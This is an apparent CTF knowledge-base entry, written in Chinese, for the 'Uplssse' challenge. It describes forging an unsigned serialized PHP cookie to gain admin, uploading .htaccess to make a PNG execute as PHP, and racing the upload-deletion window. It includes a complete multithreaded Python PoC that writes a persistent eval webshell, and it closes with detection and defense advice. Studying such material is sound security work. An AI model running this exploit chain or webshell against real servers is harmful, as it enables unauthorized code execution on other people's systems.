---
id: web-generic-file-upload-cookie-admin-htaccess-png-race-webshell
title: Cookie 对象注入改 admin + .htaccess 解除 /tmp 403 + PNG 双文件竞态写持久 WebShell
type: scenario
domain: web
path: web/generic/file-upload
technique: cookie-admin-htaccess-png-dual-race-webshell
aliases:
- Uplssse
- user_auth cookie 反序列化
- is_admin 改 1
- .htaccess 解除 403
- SetHandler application/x-httpd-php
- 双文件条件竞争
- shell.png 竞态
tags:
- web
- php
- file-upload
- race-condition
- htaccess
- apache
- deserialization
- cookie
- webshell
- ctf
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V173
  verified_at: '2026-11-06T17:37:06+08:00'
  notes: 已对照原文与图23-27核对：user_auth未签名序列化Cookie改is_admin、/tmp 403、.htaccess SetHandler/Require all granted、20/20/30线程双文件竞态、../shell.php持久化、蚁剑连接成功均一致
---

## 一句话结论

当应用把 `User` 对象序列化后 base64 放进 `user_auth` Cookie 且不签名时，攻击者改 `is_admin=1` 即可拿到上传权限；上传目录 `/tmp` 直接访问 403，但允许上传 `.htaccess`，于是用 `SetHandler application/x-httpd-php` 把 `shell.png` 解析为 PHP，并在“上传校验后删除”的窗口内并发访问 `shell.png`，让它执行并写出持久 `../shell.php`，形成双文件竞态 getshell。

## 原理

- **Cookie 对象注入**：`user_auth` 是 `base64(serialize(User))`，`User` 的 `isLoggedIn`、`is_admin` 等属性都在客户端可控；解码后把 `is_admin` 从 `0` 改成 `1`，重新 base64，服务端反序列化后即按管理员处理。根因是客户端存储对象 + 无 HMAC/签名。
- **/tmp 的 403**：上传文件落到 `/tmp/shell.png`，Web 服务器对该目录返回 403（可能禁止目录访问/脚本执行）。Apache 允许 `.htaccess` 覆盖时，可在 `/tmp/.htaccess` 写入：
  ```apache
  <FilesMatch "shell.png">
    SetHandler application/x-httpd-php
    Require all granted
  </FilesMatch>
  ```
  `Require all granted` 解除 403，`SetHandler` 把 `.png` 交给 PHP 解析。
- **双文件竞态**：上传接口会做“安全检查”，几秒后删除违规文件（`.htaccess` 与 `shell.png` 都会被删）。攻击者必须让两个文件在检查窗口内同时存在：20 个线程持续上传 `.htaccess`、20 个线程持续上传 `shell.png`、30 个线程持续请求 `/tmp/shell.png`；一旦某次请求命中“两个文件都在”的瞬间，`shell.png` 被 PHP 执行。
- **持久化**：`shell.png` 的 PHP 代码不是直接执行命令，而是 `file_put_contents('../shell.php', '<?php @eval($_REQUEST["cmd"]);?>')`，把持久 WebShell 写到 `/tmp` 的上一级（Web 根），这样即使临时文件随后被删，`/shell.php` 仍在。
- **为什么用 PNG 后缀**：上传接口可能只允许图片后缀/内容；`shell.png` 通过后缀/内容检查，靠 `.htaccess` 改变解析方式。若直接传 `.php` 会被后缀规则拦截。
- **为什么需要竞态**：`.htaccess` 和 `shell.png` 都在上传后几秒内被删除；单次上传后访问的成功率极低，必须用并发把“两文件共存 + 请求命中”的概率放大。

## 触发条件

- PHP + Apache，`AllowOverride` 允许 `.htaccess` 生效；上传目录 `/tmp` 可被 Web 访问但默认 403。
- 上传接口允许 `.htaccess`（或未过滤点开头的文件名）与图片后缀 `shell.png`。
- 上传后存在“检查/删除”延迟窗口，期间文件可被访问。
- `user_auth` Cookie 是未签名的 PHP 序列化对象，`is_admin` 可控。
- Web 根对 PHP 进程可写（`../shell.php` 能落地）。

## 利用步骤

1. **改 Cookie**：登录普通账号，抓 `user_auth`，URL decode + base64 decode，得到 `O:4:"User":4:{...;s:8:"is_admin";i:0;}`；改成 `i:1;`，base64 + URL encode，替换 Cookie。
2. **确认 admin 上传页**：访问 `/upload.php`，应显示欢迎管理员/上传表单。
3. **准备 .htaccess**：内容为上述 `FilesMatch` 块，文件名 `.htaccess`。
4. **准备 shell.png**：内容为 `<?php file_put_contents('../shell.php','<?php @eval($_REQUEST["cmd"]);?>'); echo "SUCCESS_HTACCESS_RACE"; ?>`，MIME 设为 `image/png`。
5. **并发竞态**：多线程持续 POST 上传两个文件，同时多线程 GET `/tmp/shell.png`；检测响应中出现 `SUCCESS_HTACCESS_RACE` 即命中。
6. **验证持久 shell**：访问 `/shell.php?cmd=whoami`，用蚁剑/curl 执行命令；原文截图显示蚁剑连接成功。
7. **清理**：删除 `.htaccess`、`shell.php` 与临时文件，排查同目录其他上传。

## PoC

```python
import requests, threading

BASE = "http://target:25002"
UP = BASE + "/upload.php"
ACCESS = BASE + "/tmp/shell.png"
SHELL = BASE + "/shell.php"
COOKIE = {"Cookie": "user_auth=<base64-of-serialized-User-with-is_admin-1>"}

HT = '''<FilesMatch "shell.png">
  SetHandler application/x-httpd-php
  Require all granted
</FilesMatch>'''
PNG = '''<?php
file_put_contents('../shell.php', '<?php @eval($_REQUEST["cmd"]);?>');
echo "SUCCESS_HTACCESS_RACE";
?>'''

def up(name, content, mime):
    while True:
        try:
            requests.post(UP, files={"file": (name, content, mime)},
                          data={"upload": "上传文件"}, headers=COOKIE, timeout=1)
        except Exception:
            pass

def hit():
    while True:
        try:
            r = requests.get(ACCESS, headers=COOKIE, timeout=1)
            if "SUCCESS_HTACCESS_RACE" in r.text:
                print("race won:", requests.get(SHELL, params={"cmd": "whoami"}, headers=COOKIE).text)
                return
        except Exception:
            pass

for _ in range(20): threading.Thread(target=up, args=(".htaccess", HT, "application/octet-stream"), daemon=True).start()
for _ in range(20): threading.Thread(target=up, args=("shell.png", PNG, "image/png"), daemon=True).start()
for _ in range(30): threading.Thread(target=hit, daemon=True).start()

import time; time.sleep(60)
```

原文脚本用 20/20/30 线程，运行一会儿后访问 `/shell.php`，蚁剑连接成功。

## 变体与关联

- 变体：`.user.ini` + `auto_prepend_file`（PHP-FPM/Nginx）；`AddType application/x-httpd-php .png` 替代 `SetHandler`；用 `php_value auto_append_file`；只允许单文件时把 `.htaccess` 与 png 打包成 zip/PHAR 解压；无竞态时用上传后立即访问的“先落盘后校验”窗口。
- 关联：[[web-generic-file-upload-save-then-validate-race]]（先落盘后删除的竞态基础）、[[web-generic-file-upload-htaccess-auto-append-php-filter-base64]]（.htaccess + php://filter 的另一种 getshell）、[[web-php-deserialization-session-s-hex-escape-admin-forge]]（Cookie 会话对象伪造的另一种方式）、[[web-generic-file-upload-blacklist-double-write-bypass]]（后缀过滤绕过）。
- 同题：`Uplssse` 的 `user_auth` Cookie 是 PHP `serialize(User)` 的 base64，未签名。

## 检测与防御

- **Cookie 完整性**：不要把权限对象序列化到客户端；使用服务端 session + 签名 Cookie（HMAC），或 JWT 并校验签名；对 `is_admin` 等权限字段只信服务端。
- **上传目录**：上传目录禁止 `.htaccess`/`.user.ini`/点文件；禁止脚本解析；最好放在 Web 根之外，通过下载接口读取。
- **Apache 配置**：`AllowOverride None`（或只允许必要指令）；上传目录 `Require all denied` 且不解析 PHP；禁用 `SetHandler`/`AddType` 在用户目录生效。
- **竞态**：上传后先校验再落盘（而非先落盘后删除）；校验期间文件不可访问；对高频上传/访问做速率限制。
- **检测**：监控 `.htaccess` 写入、`SetHandler`/`AddType` 关键字、`/tmp/*.png` 被当作 PHP 执行、短时间内大量上传与访问、`shell.php` 新增；对 `user_auth` 等 Cookie 做 base64 解码后出现 `O:` 序列化串告警。
